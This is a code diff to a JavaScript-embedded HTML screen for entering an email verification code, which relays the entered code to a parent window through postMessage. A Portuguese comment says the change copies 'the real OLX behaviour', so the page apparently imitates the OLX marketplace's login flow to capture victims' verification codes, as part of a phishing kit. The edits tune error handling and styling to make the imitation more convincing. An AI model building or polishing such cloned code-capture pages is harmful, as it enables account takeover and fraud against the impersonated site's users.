@@ -350,8 +350,9 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
   <script>
     (function(){
       var inputs = Array.prototype.slice.call(document.querySelectorAll('#code-wrap input'));
+      var codeWrap = document.getElementById('code-wrap');
       var loadingRow = document.getElementById('loading-row');
-      var errorEl = document.getElementById('code-error');
+      var errorEl = document.getElementById('code-error-top');
       var submitted = false;
 
       function setLoading(on){
@@ -359,15 +360,21 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
         inputs.forEach(function(i){ i.disabled = on; });
       }
 
+      function clearError(){
+        if(errorEl) errorEl.style.display = 'none';
+        if(codeWrap) codeWrap.classList.remove('has-error');
+      }
+
       function showError(msg){
         if(errorEl){
-          errorEl.textContent = msg || 'Código inválido. Verifique e tente novamente.';
+          errorEl.textContent = msg || 'Código inválido';
           errorEl.style.display = 'block';
         }
-        inputs.forEach(function(i){ i.style.borderColor = '#e53e3e'; i.value = ''; i.disabled = false; });
+        if(codeWrap) codeWrap.classList.add('has-error');
+        // Mantém os valores digitados (igual ao comportamento real da OLX)
+        inputs.forEach(function(i){ i.disabled = false; i.setAttribute('aria-invalid','true'); });
         if(loadingRow) loadingRow.style.display = 'none';
         submitted = false;
-        if(inputs[0]) inputs[0].focus();
       }
 
       function emitIfFull(){
@@ -375,7 +382,7 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
         var code = inputs.map(function(i){ return i.value || ''; }).join('');
         if(code.length === inputs.length){
           submitted = true;
-          if(errorEl) errorEl.style.display = 'none';
+          clearError();
           setLoading(true);
           window.parent.postMessage({
             type: 'iframe-help-action',
@@ -397,8 +404,8 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
       inputs.forEach(function(inp, idx){
         inp.addEventListener('input', function(){
           inp.value = (inp.value || '').replace(/\\D/g, '').slice(0, 1);
-          inp.style.borderColor = '';
-          if(errorEl) errorEl.style.display = 'none';
+          inp.removeAttribute('aria-invalid');
+          clearError();
           if(inp.value && idx < inputs.length - 1){
             inputs[idx + 1].focus();
           }
